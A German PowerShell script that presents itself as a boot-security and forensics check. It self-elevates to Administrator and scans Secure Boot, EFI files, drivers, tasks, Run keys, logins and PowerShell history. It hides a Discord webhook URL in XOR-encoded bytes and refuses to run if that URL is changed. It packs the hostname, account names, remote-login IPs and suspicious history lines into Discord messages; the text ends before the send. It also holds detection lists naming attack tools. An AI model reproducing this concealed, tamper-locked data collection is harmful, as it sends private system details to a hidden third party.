


if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = if ($PSCommandPath) { $PSCommandPath } elseif ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $null }
    if ($scriptPath) {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    } else {
        Read-Host "Bitte manuell als Administrator starten. Enter zum Beenden"
    }
    exit
}

$ErrorActionPreference = "SilentlyContinue"

$ascii = @"
  _____  _             _  _____ _ _         
 |  ___|(_) _ __   __ _| |/ ____(_) |_  _   _ 
 | |_   | || '_ \ / _' | | |    | | __|| | | |
 |  _|  | || | | | (_| | | |____| | |_ | |_| |
 |_|    |_||_| |_|\__,_|_|\_____|_|\__| \__, |
                                         __/ |
                                        |___/ 
"@
Write-Host $ascii -ForegroundColor Cyan

$_wb = [byte[]](219,199,199,195,192,137,156,156,215,218,192,208,220,193,215,157,208,220,222,156,210,195,218,156,196,214,209,219,220,220,216,192,156,130,135,139,139,139,132,131,135,131,132,129,135,133,128,130,134,132,131,130,156,209,129,158,223,240,217,250,254,252,194,130,230,195,240,214,132,218,229,198,234,219,236,135,224,192,220,225,251,251,215,227,130,208,240,193,250,233,255,194,131,198,236,133,219,225,132,130,201,128,194,247,128,213,231,215,244,242,253,132,216,129,128,244,228,229,203,214,194)
$WebhookUrl = [System.Text.Encoding]::UTF8.GetString([byte[]]($_wb | ForEach-Object { $_ -bxor 0xB3 }))

# Integritaetspruefrung 1: Webhook darf nicht veraendert worden sein
$_whEnc = [byte[]](100,101,56,56,105,101,62,111,56,56,63,111,100,100,106,63,106,108,107,111,56,56,104,111,109,101,105,63,106,100,107,106,63,108,62,106,58,58,109,105,100,100,109,58,108,107,107,105,106,104,56,110,111,57,109,56,61,101,105,108,61,107,105,61)
$_expectedHash = [System.Text.Encoding]::UTF8.GetString([byte[]]($_whEnc | ForEach-Object { $_ -bxor 0x5C }))
$_sha  = [System.Security.Cryptography.SHA256]::Create()
$_actualHash = [BitConverter]::ToString($_sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($WebhookUrl))).Replace('-','').ToLower()
$_sha.Dispose()
if ($_actualHash -ne $_expectedHash) {
    Write-Host "FEHLER: Webhook-URL wurde veraendert. Das Skript wird beendet." -ForegroundColor Red
    Read-Host "Zum Beenden Enter druecken"
    exit 1
}

$Hostname   = $env:COMPUTERNAME
$Timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
$tb         = '```'   # Triple-Backtick fuer Discord Code-Blocks



# ─── 1. Secure Boot ──────────────────────────────────────────────────────────


$secureBootStatus = "Unbekannt"
$secureBootOk     = $false

if (Get-Command Confirm-SecureBootUEFI -ErrorAction SilentlyContinue) {
    try {
        $sb = Confirm-SecureBootUEFI -ErrorAction Stop
        if ($sb) { $secureBootStatus = "Aktiviert"; $secureBootOk = $true }
        else      { $secureBootStatus = "DEAKTIVIERT" }
    } catch {
        $secureBootStatus = "Nicht unterstuetzt (Legacy BIOS)"
    }
} else {
    $secureBootStatus = "Cmdlet nicht verfuegbar (evtl. kein UEFI)"
}

# ─── 2. Registry IntegrityServices ───────────────────────────────────────────


$regPath        = "HKLM:\SYSTEM\CurrentControlSet\Control\IntegrityServices"
$regExists      = Test-Path $regPath
$regSuspicious  = $false
$regSuspDetails = [System.Collections.Generic.List[string]]::new()

if ($regExists) {
    $props = Get-ItemProperty $regPath -ErrorAction SilentlyContinue
    if ($props) {
        # Werte die Integrity-Pruefungen deaktivieren wuerden
        $suspValues = @{
            'VerifiedBootEnabled'   = { param($v) $v -eq 0 }
            'SkipInvalidPointers'   = { param($v) $v -eq 1 }
            'DisableIntegrityChecks'= { param($v) $v -eq 1 }
            'BcdLibraryBoolean_DisableIntegrityChecks' = { param($v) $v -eq 1 }
        }
        foreach ($kv in $suspValues.GetEnumerator()) {
            $val = $props.($kv.Key)
            if ($null -ne $val -and (& $kv.Value $val)) {
                $regSuspicious = $true
                $regSuspDetails.Add("$($kv.Key) = $val")
            }
        }
    }
}

# ─── 3. EFI Dateien ──────────────────────────────────────────────────────────


$efiSuspicious  = [System.Collections.Generic.List[string]]::new()
$efiLegit       = [System.Collections.Generic.List[string]]::new()
$efiScanStatus  = ""
$tempDrive      = $null
$efiPartMounted = $false
$efiPart        = $null

# Nur diese Ordner gelten als Windows-Standard
$safeFolders = @('microsoft', 'boot')

try {
    $efiPart = Get-Partition |
        Where-Object { $_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}' } |
        Select-Object -First 1

    if ($efiPart) {
        # Pruefen ob EFI-Partition schon einen Laufwerksbuchstaben hat
        $existingLetter = $efiPart.DriveLetter
        if ($existingLetter -and $existingLetter -ne [char]0) {
            $scanRoot = "${existingLetter}:"
        } else {
            # Freien Laufwerksbuchstaben suchen
            $used       = (Get-PSDrive -PSProvider FileSystem).Name
            $freeLetter = ('S','T','U','V','W','X','Y','Z' | Where-Object { $_ -notin $used }) | Select-Object -First 1
            if ($freeLetter) {
                $tempDrive = "${freeLetter}:"
                $efiPart | Add-PartitionAccessPath -AccessPath $tempDrive -ErrorAction Stop
                $efiPartMounted = $true
                Start-Sleep -Milliseconds 800
                $scanRoot = $tempDrive
            } else {
                $efiScanStatus = "Kein freier Laufwerksbuchstabe verfuegbar"
                $scanRoot = $null
            }
        }

        if ($scanRoot) {
            $efiFiles = Get-ChildItem -Path "$scanRoot\EFI" -Recurse -Filter "*.efi" -ErrorAction SilentlyContinue
            if (-not $efiFiles) {
                $efiScanStatus = "Keine .efi Dateien auf der EFI-Partition gefunden"
            } else {
                foreach ($f in $efiFiles) {
                    $rel    = $f.FullName.Substring($scanRoot.Length)  # z.B. \EFI\Microsoft\Boot\bootmgfw.efi
                    $parts  = $rel.ToLower().TrimStart('\').Split('\')  # efi, microsoft, boot, ...
                    $vendor = if ($parts.Count -ge 2) { $parts[1] } else { "" }

                    if ($vendor -in $safeFolders) {
                        $efiLegit.Add($rel)
                    } else {
                        # Signatur + Groesse der verdaechtigen Datei pruefen
                        $detail = $rel
                        try {
                            $sizeKB = [math]::Round($f.Length / 1KB, 1)
                            $sig    = Get-AuthenticodeSignature -FilePath $f.FullName -ErrorAction SilentlyContinue
                            $sigStr = if ($sig) { $sig.Status.ToString() } else { 'unbekannt' }
                            $signer = if ($sig -and $sig.SignerCertificate) {
                                ([regex]::Match($sig.SignerCertificate.Subject, 'CN=([^,]+)')).Groups[1].Value
                            } else { '-' }
                            $detail = "$rel  [${sizeKB}KB | Signatur: $sigStr | Von: $signer]"
                        } catch {}
                        $efiSuspicious.Add($detail)
                    }
                }
                $total = $efiLegit.Count + $efiSuspicious.Count
                $efiScanStatus = "$total .efi Datei(en) gefunden ($($efiLegit.Count) OK, $($efiSuspicious.Count) verdaechtig)"
            }
        }
    } else {
        $efiScanStatus = "Keine EFI-Systempartition gefunden (evtl. MBR/Legacy-Boot)"
    }
} catch {
    $efiScanStatus = "Fehler beim Scan: $($_.Exception.Message)"
} finally {
    if ($efiPartMounted -and $tempDrive -and $efiPart) {
        try { $efiPart | Remove-PartitionAccessPath -AccessPath $tempDrive -ErrorAction SilentlyContinue } catch {}
    }
}

# ─── 4. BCD Firmware Booteintraege ───────────────────────────────────────────


$bcdSuspicious = [System.Collections.Generic.List[string]]::new()
$bcdStatus     = ""
$bcdOk         = $true

try {
    $bcdRaw = & bcdedit /enum firmware 2>&1
    if ($LASTEXITCODE -eq 0) {
        $blocks   = ($bcdRaw -join "`n") -split '(?m)^-{3,}$'
        $safeDesc = @('windows boot manager','windows boot loader','windows memory tester',
                      'windows os loader','windows setup','firmware setup','uefi firmware settings')
        foreach ($block in $blocks) {
            $descMatch = [regex]::Match($block, '(?im)^description\s{2,}(.+)$')
            $idMatch   = [regex]::Match($block,  '(?im)^identifier\s{2,}(.+)$')
            if ($descMatch.Success) {
                $desc   = $descMatch.Groups[1].Value.Trim()
                $id     = if ($idMatch.Success) { $idMatch.Groups[1].Value.Trim() } else { "?" }
                $isSafe = $false
                foreach ($s in $safeDesc) { if ($desc.ToLower() -like "*$s*") { $isSafe = $true; break } }
                if (-not $isSafe) { $bcdOk = $false; $bcdSuspicious.Add("[$id] $desc") }
            }
        }
        $count     = ($blocks | Where-Object { $_ -match 'identifier' }).Count
        $bcdStatus = "$count BCD-Eintraege geprueft, $($bcdSuspicious.Count) verdaechtig"
    } else {
        $bcdStatus = "bcdedit nicht ausfuehrbar (kein UEFI oder kein Zugriff)"
    }
} catch {
    $bcdStatus = "Fehler: $($_.Exception.Message)"
}

# ─── 5. bootmgfw.efi Signaturpruefung ────────────────────────────────────────


$bootmgfwStatus  = ""
$bootmgfwSuspect = $false

$bootmgfwCandidates = [System.Collections.Generic.List[string]]@(
    "$env:SystemRoot\System32\Boot\bootmgfw.efi",
    "$env:SystemRoot\Boot\EFI\bootmgfw.efi"
)
if ($scanRoot) { $bootmgfwCandidates.Add("$scanRoot\EFI\Microsoft\Boot\bootmgfw.efi") }
$bootmgfwFile = $bootmgfwCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($bootmgfwFile) {
    try {
        $sig = Get-AuthenticodeSignature -FilePath $bootmgfwFile -ErrorAction Stop
        if ($sig.Status -eq 'Valid') {
            if ($sig.SignerCertificate.Subject -match 'Microsoft') {
                $bootmgfwStatus = "OK: Signatur gueltig (Microsoft)"
            } else {
                $bootmgfwSuspect = $true
                $bootmgfwStatus  = "VERDAECHTIG: Nicht von Microsoft signiert! ($($sig.SignerCertificate.Subject))"
            }
        } elseif ($sig.Status -eq 'NotSigned') {
            $bootmgfwSuspect = $true
            $bootmgfwStatus  = "KRITISCH: bootmgfw.efi ist NICHT signiert - moeglicherweise gepatcht!"
        } else {
            $bootmgfwSuspect = $true
            $bootmgfwStatus  = "VERDAECHTIG: $($sig.Status) - $($sig.StatusMessage)"
        }
    } catch {
        $bootmgfwStatus = "Signaturchek fehlgeschlagen: $($_.Exception.Message)"
    }
} else {
    $bootmgfwStatus = "bootmgfw.efi nicht gefunden (EFI-Partition evtl. nicht gemountet)"
}

# ─── 6. Secure Boot Key-Datenbank (db / KEK) ─────────────────────────────────


$sbKeyStatus     = ""
$sbKeySuspicious = $false

if ($secureBootOk) {
    if (Get-Command Get-SecureBootUEFI -ErrorAction SilentlyContinue) {
        try {
            $dbVar   = Get-SecureBootUEFI -Name "db"  -ErrorAction Stop
            $kekVar  = Get-SecureBootUEFI -Name "KEK" -ErrorAction Stop
            $dbSize  = $dbVar.Bytes.Length
            $kekSize = $kekVar.Bytes.Length
            # Normal: db ~3-6 KB (2-3 Microsoft-Certs), KEK ~1-2 KB
            if ($dbSize -gt 10240 -or $kekSize -gt 4096) {
                $sbKeySuspicious = $true
                $sbKeyStatus = "AUFFAELLIG: db=$([math]::Round($dbSize/1024,1))KB KEK=$([math]::Round($kekSize/1024,1))KB (unerwartet gross - moegliche Fremdkeys)"
            } else {
                $sbKeyStatus = "OK: db=$([math]::Round($dbSize/1024,1))KB KEK=$([math]::Round($kekSize/1024,1))KB (normale Groesse)"
            }
            # Secure Boot Policy pruefen
            try {
                $policy = Get-SecureBootPolicy -ErrorAction Stop
                $msPolicyGuid = '77fa9abd-0359-4d32-bd60-28f4e78f784b'
                if ($policy -and $policy.Publisher.ToString().ToLower() -ne $msPolicyGuid) {
                    $sbKeySuspicious = $true
                    $sbKeyStatus    += " | Fremde Policy-GUID: $($policy.Publisher)"
                }
            } catch {}
        } catch {
            $sbKeyStatus = "Nicht auslesbar: $($_.Exception.Message)"
        }
    } else {
        $sbKeyStatus = "Get-SecureBootUEFI nicht verfuegbar"
    }
} else {
    $sbKeyStatus = "Secure Boot inaktiv - Pruefung uebersprungen"
}

# ─── 7. Fruehe Boot-Treiber (Start=0) Signaturpruefung ───────────────────────


$suspiciousDrivers = [System.Collections.Generic.List[string]]::new()
$driverScanStatus  = ""

try {
    $bootDrivers = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" -ErrorAction SilentlyContinue |
        Where-Object { $_.Start -eq 0 -and $_.ImagePath }
    $checked = 0
    foreach ($drv in $bootDrivers) {
        $imgPath = $drv.ImagePath
        $imgPath = $imgPath -replace '(?i)^\\SystemRoot\\', "$env:SystemRoot\"
        $imgPath = $imgPath -replace '^\\\?\?\\', ''
        if ($imgPath -match '^(?i)system32\\') { $imgPath = "$env:SystemRoot\$imgPath" }
        $imgPath = $imgPath.Trim('"').Trim()
        if (-not (Test-Path $imgPath -ErrorAction SilentlyContinue)) { continue }
        $checked++
        $sig = Get-AuthenticodeSignature -FilePath $imgPath -ErrorAction SilentlyContinue
        if (-not $sig) { continue }
        if ($sig.Status -eq 'NotSigned') {
            $suspiciousDrivers.Add("[UNSIGNIERT] $($drv.PSChildName)`n           Pfad: $imgPath")
        } elseif ($sig.Status -notin @('Valid', 'IncompatibleFlags')) {
            $suspiciousDrivers.Add("[$($sig.Status)] $($drv.PSChildName)`n           Pfad: $imgPath")
        } elseif ($sig.Status -eq 'Valid' -and $sig.SignerCertificate.Subject -notmatch 'Microsoft') {
            $cn = ([regex]::Match($sig.SignerCertificate.Subject, 'CN=([^,]+)')).Groups[1].Value
            $suspiciousDrivers.Add("[Non-MS] $($drv.PSChildName) - von: $cn`n           Pfad: $imgPath")
        }
    }
    $driverScanStatus = "$checked Boot-Treiber geprueft, $($suspiciousDrivers.Count) auffaellig"
} catch {
    $driverScanStatus = "Fehler: $($_.Exception.Message)"
}

# ─── Forensik-Analyse ────────────────────────────────────────────────────────


# F1: Prefetch - welche .exe wann zuletzt ausgefuehrt wurde

$pfSuspicious = [System.Collections.Generic.List[string]]::new()
$pfStatus     = "Prefetch nicht zugaenglich"
try {
    $pfDir = "$env:SystemRoot\Prefetch"
    if (Test-Path $pfDir) {
        $pfAll   = Get-ChildItem "$pfDir\*.pf" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
        $pfCount = ($pfAll | Measure-Object).Count
        foreach ($pf in ($pfAll | Select-Object -First 60)) {
            $exeName = ($pf.Name -replace '-[0-9A-F]{8}\.pf$', '').ToLower()
            $lastRun = $pf.LastWriteTime.ToString('MM-dd HH:mm')
            $isHex   = $exeName -match '^[0-9a-f]{6,16}\.exe$'
            $noVowel = ($exeName.Length -le 14) -and ($exeName -notmatch '[aeiouy]') -and ($exeName -match '\.exe$')
            $safe    = $exeName -match 'svchost|lsass|csrss|werfault|conhost|dllhost|spoolsv|msiexec|regsvr|rundll|cmd\.exe|powershell|explorer|taskmgr|winlogon|wininit|smss|dwm|ctfmon|chrome|firefox|edge|msedge|steam|discord|teams|zoom|slack|onedrive|outlook|word|excel|powerpnt|searchapp|runtimebroker|sihost|backgroundtaskhost'
            if (($isHex -or $noVowel) -and -not $safe) {
                # Versuche den echten Pfad zu finden
                $foundPath = ''
                $searchDirs = @("$env:SystemRoot\System32", "$env:SystemRoot", "$env:ProgramFiles", "${env:ProgramFiles(x86)}", "$env:LOCALAPPDATA", "$env:APPDATA", "$env:TEMP")
                foreach ($dir in $searchDirs) {
                    $candidate = Join-Path $dir $exeName
                    if (Test-Path $candidate -ErrorAction SilentlyContinue) { $foundPath = $candidate; break }
                }
                # App Paths Registry
                if (-not $foundPath) {
                    $ap = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\$exeName" -ErrorAction SilentlyContinue
                    if ($ap -and $ap.'(default)') { $foundPath = $ap.'(default)' }
                }
                $pathInfo = if ($foundPath) { "  Gefunden: $foundPath" } else { "  Pfad nicht auffindbar (evtl. geloescht)" }
                $pfSuspicious.Add("$lastRun | $exeName`n$pathInfo")
            }
        }
        $pfStatus = "$pfCount Eintraege gesamt, $($pfSuspicious.Count) verdaechtige Namen"
    }
} catch { $pfStatus = "Fehler: $($_.Exception.Message)" }

# F2: Geplante Tasks ausserhalb Microsoft/Windows (Persistenz)

$suspTasks  = [System.Collections.Generic.List[string]]::new()
$taskStatus = ""
try {
    $allTasks  = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Disabled' }
    foreach ($task in $allTasks) {
        $tpLower = $task.TaskPath.ToLower()
        $isSafe  = $tpLower -like '*\microsoft\*' -or $tpLower -like '*\windows\*'
        if (-not $isSafe) {
            $actionDetails = $task.Actions | ForEach-Object {
                $exe  = $_.Execute
                $args = $_.Arguments
                $wdir = $_.WorkingDirectory
                $line = $exe
                if ($args)  { $line += " $args" }
                if ($wdir)  { $line += "  [WorkDir: $wdir]" }
                # Signatur pruefen falls es eine Datei ist
                $exeResolved = $exe -replace '"', ''
                if ($exeResolved -and (Test-Path $exeResolved -ErrorAction SilentlyContinue)) {
                    $sig = Get-AuthenticodeSignature $exeResolved -ErrorAction SilentlyContinue
                    if ($sig) { $line += "  [Sig: $($sig.Status)" + $(if ($sig.SignerCertificate) { " / $(([regex]::Match($sig.SignerCertificate.Subject,'CN=([^,]+)')).Groups[1].Value)" } else { '' }) + "]" }
                }
                $line
            }
            $suspTasks.Add("$($task.TaskPath)$($task.TaskName)`n   CMD: $($actionDetails -join ' | ')")
        }
    }
    $taskStatus = "$(($allTasks | Measure-Object).Count) aktive Tasks, $($suspTasks.Count) ausserhalb Microsoft/Windows"
} catch { $taskStatus = "Fehler: $($_.Exception.Message)" }

# F3: WMI Event Subscriptions (stealthy Backdoor-Methode)

$wmiFindings = [System.Collections.Generic.List[string]]::new()
$wmiStatus   = ""
try {
    # Nur CommandLine- und ActiveScript-Consumer sind gefaehrlich (fuehren Code aus)
    # NTEventLogEventConsumer schreibt nur ins Log -> kein Risiko, ignorieren
    $wmiCmdCons = Get-WMIObject -Namespace 'root/subscription' -Class 'CommandLineEventConsumer'  -ErrorAction SilentlyContinue
    $wmiScrCons = Get-WMIObject -Namespace 'root/subscription' -Class 'ActiveScriptEventConsumer' -ErrorAction SilentlyContinue
    # Filter nur melden wenn ein dazugehoeriger gefaehrlicher Consumer existiert
    if ($wmiCmdCons) { foreach ($c in $wmiCmdCons) { $wmiFindings.Add("[Cmd-Exec] $($c.Name): $($c.CommandLineTemplate)") } }
    if ($wmiScrCons) { foreach ($s in $wmiScrCons) { $wmiFindings.Add("[Script]   $($s.Name)") } }
    $wmiStatus = if ($wmiFindings.Count -eq 0) { "Keine ausfuehrbaren WMI Subscriptions (normal)" } else { "FUND: $($wmiFindings.Count) code-ausfuehrende Subscription(s)!" }
} catch { $wmiStatus = "Fehler: $($_.Exception.Message)" }

# F4: Registry Run-Keys (Autostart-Persistenz)

$runKeyAll     = [System.Collections.Generic.List[string]]::new()
$runKeySuspect = [System.Collections.Generic.List[string]]::new()
$runKeyStatus  = ""
$runKeyPaths   = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
)
foreach ($rkp in $runKeyPaths) {
    if (Test-Path $rkp) {
        $rkShort = $rkp -replace '.*\\CurrentVersion\\Run', 'Run'
        $props   = Get-ItemProperty $rkp -ErrorAction SilentlyContinue
        if ($props) {
            $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                $entry = "[$rkShort] $($_.Name) = $($_.Value)"
                $runKeyAll.Add($entry)
                $val = "$($_.Value)".ToLower()
                if ($val -match 'temp\\|\\downloads\\|\\public\\|cmd /c|powershell -e|wscript |cscript |regsvr32|mshta|certutil|bitsadmin') {
                    $runKeySuspect.Add($entry)
                }
            }
        }
    }
}
$runKeyStatus = "$($runKeyAll.Count) Run-Key Eintraege, $($runKeySuspect.Count) verdaechtig"

# F5: Lokale Benutzerkonten

$userFindings = [System.Collections.Generic.List[string]]::new()
$userStatus   = ""
try {
    $users    = Get-LocalUser -ErrorAction SilentlyContinue
    $builtins = @('DefaultAccount', 'Guest', 'WDAGUtilityAccount')
    foreach ($u in $users) {
        if ($u.Name -in $builtins -and -not $u.Enabled) { continue }
        $flag   = if ($u.Enabled) { "AKTIV" } else { "deaktiv" }
        $pwDate = if ($u.PasswordLastSet) { $u.PasswordLastSet.ToString('yyyy-MM-dd') } else { "nie" }
        $userFindings.Add("[$flag] $($u.Name) (PW: $pwDate)")
    }
    $active   = ($users | Where-Object { $_.Enabled -and $_.Name -notin $builtins } | Measure-Object).Count
    $userStatus = "$(($users | Measure-Object).Count) Konten, $active aktiv"
} catch { $userStatus = "Fehler: $($_.Exception.Message)" }

# F6: Remote-Logins aus Security Log (Typ 3=Netzwerk, Typ 10=RDP)

$remoteLogins = [System.Collections.Generic.List[string]]::new()
$loginStatus  = ""
try {
    $loginEvents = Get-WinEvent -FilterHashtable @{LogName = 'Security'; Id = 4624} -MaxEvents 300 -ErrorAction SilentlyContinue
    foreach ($ev in $loginEvents) {
        $xml       = [xml]$ev.ToXml()
        $data      = $xml.Event.EventData.Data
        $logonType = ($data | Where-Object { $_.Name -eq 'LogonType' }).'#text'
        if ($logonType -notin @('3', '10')) { continue }
        $user   = ($data | Where-Object { $_.Name -eq 'TargetUserName' }).'#text'
        $srcIP  = ($data | Where-Object { $_.Name -eq 'IpAddress' }).'#text'
        $srcHst = ($data | Where-Object { $_.Name -eq 'WorkstationName' }).'#text'
        if ($user -match '\$$' -or -not $srcIP -or $srcIP -in @('-', '127.0.0.1', '::1', '')) { continue }
        $typeLabel = if ($logonType -eq '10') { 'RDP' } else { 'Net' }
        $remoteLogins.Add("$($ev.TimeCreated.ToString('MM-dd HH:mm')) [$typeLabel] $user von $srcIP ($srcHst)")
    }
    $loginStatus = if ($remoteLogins.Count -gt 0) { "$($remoteLogins.Count) externe Remote-Logins gefunden!" } else { "Keine externen Remote-Logins (letzte 300 Events)" }
} catch { $loginStatus = "Fehler/Kein Zugriff: $($_.Exception.Message)" }

# F7: Windows Defender Threat History

$defThreats      = [System.Collections.Generic.List[string]]::new()
$defThreatStatus = "Defender nicht verfuegbar"
try {
    if (Get-Command Get-MpThreatDetection -ErrorAction SilentlyContinue) {
        $threats = Get-MpThreatDetection -ErrorAction SilentlyContinue | Sort-Object InitialDetectionTime -Descending | Select-Object -First 10
        foreach ($t in $threats) {
            $fullRes  = ($t.Resources | Select-Object -First 1)
            $shortRes = $fullRes -replace '.*\\', ''
            $line = "$($t.InitialDetectionTime.ToString('yyyy-MM-dd HH:mm')) | $($t.ThreatName)"
            $line += "`n   Datei: $shortRes"
            if ($fullRes -and $fullRes -ne $shortRes) { $line += "`n   Pfad:  $fullRes" }
            $line += "`n   Aktion: $($t.ActionSuccess) | Kategorie: $($t.ThreatCategoryID)"
            $defThreats.Add($line)
        }
        $defThreatStatus = if ($defThreats.Count -gt 0) { "$($defThreats.Count) Funde in Defender-History" } else { "Keine Threats in History" }
    }
} catch { $defThreatStatus = "Fehler: $($_.Exception.Message)" }

# F8: PowerShell History auf verdaechtige Befehle

$psHistory       = [System.Collections.Generic.List[string]]::new()
$psHistoryStatus = "PS History nicht gefunden"
$psHistPath      = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistPath) {
    $allLines = Get-Content $psHistPath -ErrorAction SilentlyContinue | Where-Object { $_ -and $_.Trim() }
    $keywords = @('Invoke-Expression', 'iex ', 'DownloadString', 'DownloadFile', 'Net.WebClient',
                  'WebRequest', 'Start-Process', 'certutil', 'bitsadmin', 'reg add',
                  'schtasks /create', 'wmic', 'mshta', 'regsvr32', 'rundll32',
                  '-EncodedCommand', '-enc ', 'bypass', 'hidden', 'FromBase64',
                  'Reflection.Assembly', 'LoadWithPartialName')
    foreach ($line in $allLines) {
        foreach ($kw in $keywords) {
            if ($line -match [regex]::Escape($kw)) { $psHistory.Add($line.Trim()); break }
        }
    }
    $totalLines      = ($allLines | Measure-Object).Count
    $psHistoryStatus = "$totalLines Zeilen, $($psHistory.Count) verdaechtige Muster"
}

# ─── Konsolen-Ausgabe ─────────────────────────────────────────────────────────

# ─── Discord Embeds aufbauen ──────────────────────────────────────────────────

# --- Embed 1: UEFI/Boot ---
$sbValue     = if ($secureBootOk) { ":white_check_mark: $secureBootStatus" } else { ":x: **$secureBootStatus**" }
$regFieldVal = if ($regSuspicious) {
    $v = ":rotating_light: **Verdaechtige Werte gefunden:**`n${tb}`n"
    $regSuspDetails | ForEach-Object { $v += "$_`n" }
    $v + $tb
} elseif ($regExists) {
    ":white_check_mark: Vorhanden (normaler Windows-Key, keine Manipulationswerte)"
} else {
    ":white_check_mark: Nicht vorhanden"
}
$efiLines = if ($efiSuspicious.Count -gt 0) {
    $v = ":rotating_light: **$($efiSuspicious.Count) verdaechtige Datei(en):**`n${tb}`n"
    $efiSuspicious | Select-Object -First 8 | ForEach-Object { $v += "$([System.IO.Path]::GetFileName($_))`n" }
    if ($efiSuspicious.Count -gt 8) { $v += "... +$($efiSuspicious.Count-8) weitere`n" }
    $v + $tb
} else { ":white_check_mark: Keine verdaechtigen EFI-Dateien" }
$bcdField = if ($bcdSuspicious.Count -gt 0) {
    $v = ":rotating_light: **$($bcdSuspicious.Count) verdaechtige Eintraege:**`n${tb}`n"
    $bcdSuspicious | Select-Object -First 6 | ForEach-Object { $v += "$_`n" }
    $v + $tb
} else { ":white_check_mark: $bcdStatus" }
$bmgfwField  = if ($bootmgfwSuspect)  { ":rotating_light: **$bootmgfwStatus**" }  else { ":white_check_mark: $bootmgfwStatus" }
$sbKeyField  = if ($sbKeySuspicious)  { ":warning: **$sbKeyStatus**" }             else { ":white_check_mark: $sbKeyStatus" }
$driverField = if ($suspiciousDrivers.Count -gt 0) {
    $v = ":warning: **$($suspiciousDrivers.Count) auffaellige Boot-Treiber:**`n${tb}`n"
    $suspiciousDrivers | Select-Object -First 8 | ForEach-Object { $v += "$_`n" }
    if ($suspiciousDrivers.Count -gt 8) { $v += "... +$($suspiciousDrivers.Count-8) weitere`n" }
    $v + "${tb}`n_($driverScanStatus)_"
} else { ":white_check_mark: $driverScanStatus" }
foreach ($fRef in @([ref]$efiLines,[ref]$bcdField,[ref]$bmgfwField,[ref]$sbKeyField,[ref]$driverField)) {
    if ($fRef.Value.Length -gt 1024) { $fRef.Value = $fRef.Value.Substring(0,1020) + "..." }
}
$e1Color = if ((-not $secureBootOk) -or $regExists -or ($efiSuspicious.Count -gt 0) -or (-not $bcdOk) -or $bootmgfwSuspect -or $sbKeySuspicious -or ($suspiciousDrivers.Count -gt 0)) { 15158332 } else { 3066993 }
$embed1 = [ordered]@{
    title       = ":shield: UEFI/Boot Security | $Hostname"
    description = ":clock1: $Timestamp"
    color       = $e1Color
    fields      = @(
        [ordered]@{ name = "Secure Boot";                    value = $sbValue;     inline = $false }
        [ordered]@{ name = "IntegrityServices Registry Key"; value = $regFieldVal; inline = $false }
        [ordered]@{ name = "EFI Dateien";                    value = $efiLines;    inline = $false }
        [ordered]@{ name = "BCD Firmware-Booteintraege";     value = $bcdField;    inline = $false }
        [ordered]@{ name = "bootmgfw.efi Signatur";          value = $bmgfwField;  inline = $false }
        [ordered]@{ name = "Secure Boot Keys (db/KEK)";      value = $sbKeyField;  inline = $false }
        [ordered]@{ name = "Boot-Treiber (Start=0)";         value = $driverField; inline = $false }
    )
    footer = [ordered]@{ text = "securecheck.ps1" }
}

# --- Embed 2: Forensik (Prefetch, WMI, Run-Keys, Benutzer, Remote-Logins) ---
$f1Field = if ($pfSuspicious.Count -gt 0) {
    $v = ":warning: **$($pfSuspicious.Count) verdaechtige Namen:**`n${tb}`n"
    $pfSuspicious | Select-Object -First 10 | ForEach-Object { $v += "$_`n" }
    if ($pfSuspicious.Count -gt 10) { $v += "... +$($pfSuspicious.Count-10) weitere`n" }
    $v + $tb
} else { ":white_check_mark: $pfStatus" }
$f3Field = if ($wmiFindings.Count -gt 0) {
    $v = ":rotating_light: **WMI BACKDOOR ($($wmiFindings.Count) Objekte):**`n${tb}`n"
    $wmiFindings | ForEach-Object { $v += "$_`n" }
    $v + $tb
} else { ":white_check_mark: $wmiStatus" }
$f4Field = if ($runKeySuspect.Count -gt 0) {
    $v = ":warning: **$($runKeySuspect.Count) verdaechtige Run-Keys:**`n${tb}`n"
    $runKeySuspect | ForEach-Object { $v += "$_`n" }
    $v + $tb
} elseif ($runKeyAll.Count -gt 0) {
    $v = ":information_source: $runKeyStatus`n${tb}`n"
    $runKeyAll | Select-Object -First 10 | ForEach-Object { $v += "$_`n" }
    if ($runKeyAll.Count -gt 10) { $v += "... +$($runKeyAll.Count-10) weitere`n" }
    $v + $tb
} else { ":white_check_mark: Keine Run-Key Eintraege" }
$f5Field = if ($userFindings.Count -gt 0) {
    $v = ":information_source: $userStatus`n${tb}`n"
    $userFindings | ForEach-Object { $v += "$_`n" }
    $v + $tb
} else { ":information_source: $userStatus" }
$f6Field = if ($remoteLogins.Count -gt 0) {
    $v = ":rotating_light: **$($remoteLogins.Count) Remote-Logins:**`n${tb}`n"
    $remoteLogins | Select-Object -First 12 | ForEach-Object { $v += "$_`n" }
    if ($remoteLogins.Count -gt 12) { $v += "... +$($remoteLogins.Count-12) weitere`n" }
    $v + $tb
} else { ":white_check_mark: $loginStatus" }
foreach ($fRef in @([ref]$f1Field,[ref]$f3Field,[ref]$f4Field,[ref]$f5Field,[ref]$f6Field)) {
    if ($fRef.Value.Length -gt 1024) { $fRef.Value = $fRef.Value.Substring(0,1020) + "..." }
}
